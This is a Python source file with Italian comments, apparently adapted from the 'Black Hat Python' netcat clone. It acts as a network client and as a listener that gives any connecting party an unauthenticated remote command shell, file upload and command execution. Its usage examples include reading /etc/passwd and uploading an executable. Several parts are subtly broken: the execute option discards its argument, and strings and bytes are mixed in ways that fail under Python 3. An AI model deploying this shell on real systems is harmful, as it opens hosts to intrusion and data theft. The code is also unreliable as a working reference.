import sys
import socket
import getopt
import threading
import subprocess

# Definisco alcune variabili globali
listen = False
command = False
upload = False
execute = ""
target = ""
upload_destination = ""
port = 0

def usage():
    print()
    print("Usage: netcat.py -t target_host -p port")
    print("[-l] [--listen] ascolta su [host]:[port] in attesa di connessioni")
    print("[-e] [--execute=file_to_run] esegui il file appena ricevi una connessione")
    print("[-c] [--commandshell] inizializza un comando di shell")
    print("[-u] [--upload=destination] fai l'upload del file e scrivi su [destination]")
    print()
    print("Alcuni esempi: ")
    print("netcat.py -t 192.168.1.1 -p 5555 -l -c")
    print("netcat.py -t 192.168.1.1 -p 5555 -l -u=c:\\target.exe")
    print("netcat.py -t 192.168.1.1 -p 5555 -l -e='cat /etc/passwd'")
    sys.exit(0)

def client_sender(buffer):
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    try:
        # connettiti al nostro target host
        client.connect((target, port))

        # se rileviamo dall'input da stdin allora inviamolo
        # altrimenti aspettiamo che l'utente inserisca qualcosa

        if len(buffer):
            client.send(buffer.encode())

        while True:
            # ora aspettiamo i dati in risposta
            recv_len = 1
            response = ""

            while recv_len:
                data = client.recv(4096)
                recv_len = len(data)
                response += data.decode()
                if recv_len < 4096:
                    break
            print(response, end= " ")

            # aspetta nuovi input
            buffer = str(input())
            buffer += "\n"

            # invia il contenuto del buffer
            client.send(buffer.encode())
    except:
        # gestisci errori generici
        print("[*] Exception! Exiting.")
        client.close()

def run_command(command):
    # rimuovi l'interruzione di linea
    command = command.rstrip()

    # esegui il comando e ottieni l'output della risposta
    try:
        output = subprocess.check_output(
            command,
            stderr=subprocess.STDOUT,
            shell = True)
    except:
        output = "Failed to execute command.\r\n"

    return output

def client_handler(client_socket):
    global upload
    global execute
    global command

    #verifica che si possano ricevere dei file
    if len(upload_destination):
        # leggi tutti i byte e scrivi nella nostra destinazione
        file_buffer = ""
        while True:
            data = client_socket.recv(1024)

            if not data:
                break
            else:
                file_buffer += data
        try:
            file_descriptor = open(upload_destination, "wb")
            file_descriptor.write(file_buffer.encode())
            file_descriptor.close()

            # diamo conferma che abbiamo scritto il file
            # msg = "Successfully saved file to %s\r\n" % upload_destination
            client_socket.send("Successfully saved file to %s\r\n" % upload_destination)
        except:
            # msg = "Failed to save file to %s\r\n" % upload_destination
            client_socket.send("Failed to save file to %s\r\n" % upload_destination)

    # verifica l'esecuzione del comando
    if len(execute):
        # esegui il comando
        output = run_command(execute)
        client_socket.send(output)

    if command:
        while True:
            # mostra un semplice prompt
            msg = ("<BHP:#> ").encode()
            client_socket.send(msg)

            # ora rivediamo sinchè vediamo un lineefeed (enter key)
            cmd_buffer = ""
            while "\n" not in cmd_buffer:
                cmd_buffer += client_socket.recv(1024).decode()

            # abbiamo un comando valido quindi eseguiamolo e spediamo
            # indietro il risultato
            response = run_command(cmd_buffer)

            #restituisci la risposta
            client_socket.send(response)


def server_loop():
    global target
    global port

    # se non è specificato un target, ascoltiamo su tutte
    # le interfacce
    if not len(target):
        target = "0.0.0.0"

    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind((target, port))

    server.listen(5)
    print("[*] Listening on %s:%d" % (target, port))
    while True:
        client_socket, addr = server.accept()

        # creiamo un thread per gestire il nostro client
        client_thread = threading.Thread(
            target= client_handler,
            args= (client_socket,))
        client_thread.start()



def main():
    global listen
    global port
    global execute
    global command
    global upload_destination
    global target

    if not len(sys.argv[1:]):
        usage()

    # leggi le opzioni da riga di comando
    try:
        opts,args = getopt.getopt(
            sys.argv[1:],
            "hle:t:p:cu:",
            ["help", "listen", "execute", "target", "port", "command", "upload"])
    except getopt.GetoptError as err:
        print(str(err))
        usage()

    for o,a in opts:
        if o in ("-h", "--help"):
            usage()
        elif o in ("-l", "--listen"):
            listen = True
        elif o in ("-e", "--execute"):
            execute = True
        elif o in ("-c", "--commandshell"):
            command = True
        elif o in ("-u", "--upload"):
            upload_destination = a
        elif o in ("-t", "--target"):
            target = a
        elif o in ("-p","--port"):
            port = int(a)
        else:
            assert False, "Unhandled Option"

    # staremo in ascolto o invieremo i dati dallo stdin
    if not listen and len(target) and port > 0:
        # leggi il buffer da riga di comando
        # questa operazione sarà bloccante, per cui digita
        # CTRL+D se non vuoi leggere dallo standard input
        buffer = sys.stdin.read()

        #invia i dati
        client_sender(buffer)

        # resteremo in ascolto e potenzialmente faremo degli upload,
        # eseguiremo comandi e ritorneremo alla shella a seconda
        # delle nostre opzioni da linea di comando indicate sopra
    if listen:
        server_loop()

main()



